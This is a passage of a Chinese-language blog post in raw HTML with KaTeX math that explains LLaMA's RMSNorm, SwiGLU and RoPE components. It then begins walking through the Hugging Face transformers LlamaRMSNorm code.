class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>；而相比于 Transformer 使用的 layerNorm：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>μ</mi><mo>=</mo><mfrac><mn>1</mn><mi>n</mi></mfrac><msubsup><mo>∑</mo><mi>i</mi><mi>n</mi></msubsup><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\mu = \frac{1}{n}\sum_i^n{a_i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">μ</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1901em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>σ</mi><mo>=</mo><msqrt><mrow><mfrac><mn>1</mn><mi>n</mi></mfrac><msubsup><mo>∑</mo><mi>i</mi><mi>n</mi></msubsup><mrow><mo stretchy="false">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo>−</mo><mi>μ</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></mrow></msqrt></mrow><annotation encoding="application/x-tex">\sigma = \sqrt{\frac{1}{n}\sum_i^n{(a_i-\mu)^2}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.84em;vertical-align:-0.6049em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2351em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">μ</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7401em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.1951em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.88em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.88em" viewBox="0 0 400000 1944" preserveAspectRatio="xMinYMin slice"><path d="M983 90l0 -0c4,-6.7,10,-10,18,-10 H400000v40H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5c53.7,-170.3,84.5,-266.8,92.5,-289.5zM1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.6049em;"><span></span></span></span></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mover accent="true"><mi>a</mi><mo>ˉ</mo></mover><mi>i</mi></msub><mo>=</mo><mfrac><mrow><msub><mi>a</mi><mi>i</mi></msub><mo>−</mo><mi>μ</mi></mrow><mi>σ</mi></mfrac><msub><mi>g</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\bar{a}_i = \frac{a_i -\mu}{\sigma}g_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7178em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5678em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal">a</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1994em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8544em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">σ</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4461em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mathnormal mtight">μ</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li><li>Why：为了提升训练的稳定性，对每个 Transformer 子层的输入进行归一化，而不是像原 Transformer 仅对输出进行归一化；此外，相比 layerNorm，RMSNorm 仅支持 re-scaling 计算开销更低，因为<a href="https://openreview.net/forum?id=BylmcHHgIB">研究</a>表明，归一化的主要贡献来自于 re-scaling 而非 re-centering。</li></ul></li><li><a href="https://paperswithcode.com/method/swiglu">SwiGLU</a> 激活函数<ul><li>What：非线性处处可导的激活函数，相比原先 Transformer 架构采用的 ReLU 激活函数。</li><li>How：SwiGLU 其实就是采用 Swish 函数作为激活函数的 GLU 变体，其公式为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>w</mi><mi>i</mi><mi>G</mi><mi>L</mi><mi>U</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>W</mi><mo separator="true">,</mo><mi>V</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo stretchy="false">)</mo><mo>=</mo><mi>S</mi><mi>w</mi><mi>i</mi><mi>s</mi><msub><mi>h</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>x</mi><mi>W</mi><mo>+</mo><mi>b</mi><mo stretchy="false">)</mo><mo>⊗</mo><mo stretchy="false">(</mo><mi>x</mi><mi>V</mi><mo>+</mo><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">SwiGLU(x, W, V, b, c) = Swish_1(xW+b)\otimes(xV+c)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">Sw</span><span class="mord mathnormal">i</span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.10903em;">LU</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">Sw</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span>，其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>w</mi><mi>i</mi><mi>s</mi><msub><mi>h</mi><mi>β</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>x</mi><mi>σ</mi><mo stretchy="false">(</mo><mi>β</mi><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Swish_\beta(x) = x\sigma(\beta x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">Sw</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05278em;">β</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></li><li>Why：该激活函数用科学系的参数，非线性且处处可导，有门控机制可以选择性地过滤部分输入，缓解梯度消失的问题，可以显著提高模型的训练效果。</li></ul><blockquote><p>GLU（Gated Linear Units）是一种门控机制的神经网络层，它由一个线性变换和一个激活函数组成。例如，若使用 sigmoid 函数作为门控机制，用于控制信息能够通过的“开关”，其公式为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mi>L</mi><mi>U</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>W</mi><mo separator="true">,</mo><mi>V</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo stretchy="false">)</mo><mo>=</mo><mi>σ</mi><mo stretchy="false">(</mo><mi>x</mi><mi>W</mi><mo>+</mo><mi>b</mi><mo stretchy="false">)</mo><mo>⊗</mo><mo stretchy="false">(</mo><mi>x</mi><mi>V</mi><mo>+</mo><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">GLU(x, W, V, b, c) = \sigma(xW+b)\otimes (xV+c)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.10903em;">LU</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span>。</p></blockquote></li><li><a href="https://paperswithcode.com/method/rope">Rotaty Embeddings</a> （旋转位置编码 RoPE）<ul><li>What：一种相对位置编码，给输入和输出的文本序列做编号。因为 Transformer 没有保存文本语序的信息，因此需要在输入（输出）时添加位置编码以保证处理的语序结果是正确的</li><li>How：具体的矩阵编码形式如下图：推理过程参考<a href="https://kexue.fm/archives/8265">博采众长的旋转式位置编码</a>。由于从矢量旋转出发推理得到的旋转矩阵过于稀疏（下右图），因此在实际计算时，往往会采用左下图矩阵按位乘的方法并行计算。其中，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>θ</mi><mi>i</mi></msub><mo>=</mo><mn>1000</mn><msup><mn>0</mn><mrow><mo>−</mo><mn>2</mn><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi>d</mi></mrow></msup><mo separator="true">,</mo><mi>i</mi><mo>∈</mo><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>d</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\theta_i = 10000^{-2(i-1)/d}, i \in [1,2,...,d/2]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0824em;vertical-align:-0.1944em;"></span><span class="mord">1000</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">2</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span><span class="mord mtight">/</span><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mord">/2</span><span class="mclose">]</span></span></span></span></li><li>Why：该位置编码有如下特性：上下文表示与旋转矩阵相乘来编码相对位置；可扩展到任意长度，适应任意长度的序列输入输出；可用于线性注意力机制；词间距离与依赖性相关。</li></ul>  <figure class="half">      <img src="/img/LLM/RoPE.png">      <img src="/img/LLM/RoPE2.png">  </figure></li></ul><p>最后，我们来看一下 Transformer、llama、llama-2 模型基块的具体架构图：</p><figure class="half">    <img src="/img/LLM/transformer.png">    <img src="/img/LLM/llama.png"></figure><h2 id="llama-基件">llama 基件</h2><p>随着大语言 AI 模型的不断发展，与之相关的开源社区和开源代码也在不断地丰富和壮大。本博客主要研究 <a href="https://github.com/huggingface/transformers">huggingface transformer</a> 开源框架，Huggingface 是一家在 NLP 社区做出杰出贡献的纽约创业公司，其所提供的大量预训练模型和代码等资源被广泛的应用于学术研究当中，现已经发展成为大语言 AI 模型领域中最大的开源社区之一。Huggingface 框架提供了数以千计针对各种任务的预训练模型，开发者可以根据自身的需要，选择模型进行训练或微调，也可参考相关文档和源码，从而快速开发新模型。</p><p>本节开始带领大家深入理解 <a href="https://github.com/huggingface/transformers/tree/main/src/transformers/models/llama">transformers llama</a> 的核心实现。我们先从搭建 llama 的基础组件开始，一步一步从底到顶走过整个代码结构。</p><h3 id="RMSNorm">RMSNorm</h3><p>在对 RMSNorm 有一定了解后，我们来看一下 RMSNorm 的实现<a href="https://github.com/huggingface/transformers/blob/main/src/transformers/models/llama/modeling_llama.py">代码</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LlamaRMSNorm</span>(nn.Module):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, hidden_size, eps=<span class="hljs-number">1e-6</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    LlamaRMSNorm is equivalent to T5LayerNorm</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">super</span>().__init__()<br>    self.weight = nn.Parameter(torch.ones(hidden_size))<br>    self.variance_epsilon = eps<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, hidden_states</span>):<br>    input_dtype = hidden_states.dtype<br>    hidden_states = hidden_states.to(torch.float32)<br>    variance = hidden_states.<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>).mean(-<span class="hljs-number">1</span>, keepdim=<span class="hljs-literal">True</span>)<br>    hidden_states = hidden_states * torch.rsqrt(variance + self.variance_epsilon)<br>    <span class="hljs-keyword">return</span> self.weight * hidden_states.to(input_dtype)<br></code></pre></td></tr></table></figure><p><code>self.variance_epsilon</code> 是用来规避可能出现的协方差为0的情况而引入的极小值。<code>forward</code> 函数的代码对应了之前给出的公式：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mi>M</mi><mi>S</mi><mo stretchy="false">(</mo><mi>a</mi><mo stretchy="false">)</mo><mo>=</mo><msqrt><mrow><mfrac><mn>1</mn><mi>n</mi></mfrac><msubsup><mo>∑</mo><mi>i</mi><mi>n</mi></msubsup><msubsup><mi>a</mi><mi>i</mi><mn>2</mn></msubsup></mrow></msqrt></mrow><annotation encoding="application/x-tex">RMS(a) = \sqrt{\frac{1}{n}\sum_i^n{a_i^2}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">RMS</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.84em;vertical-align:-0.6049em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2351em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 